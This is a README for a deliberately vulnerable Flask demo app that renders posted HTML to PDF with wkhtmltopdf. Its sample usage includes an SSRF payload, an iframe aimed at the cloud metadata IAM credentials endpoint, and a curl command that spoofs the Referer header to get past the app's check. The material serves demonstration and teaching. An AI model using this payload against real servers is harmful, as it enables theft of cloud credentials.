# renderHTML.py

## Summary
This is a deliberately vulnerable flask application that accepts HTML, renders it using wkhtmltopdf, and returns the PDF file.
It also checks the referer header as a token defense against abuse.  Bypassing this defense makes a better demo.

## Requirements
Python Libraries (pip install -r requirements.txt)
* flask
* pdfkit

wkhtmltopdf (must be installed at the OS level - https://wkhtmltopdf.org/downloads.html)

## Sample Usage
_Modify the string in the referer check to be the domain where you're hosting it, or just remove the check depending on your needs_

Create a test file containing the HTML:
``{"content":"<HTML><BODY>Metadata output:</BR><IFRAME src=\" http://169.254.169.254/latest/meta-data/iam/security-credentials/\" width=1000 height=1000></IFRAME></BODY></HTML>"}
``

Now use curl to send it
``curl -H "Referer: api.uuw.app" --json @testfile.json http://render.uuw.app/render``
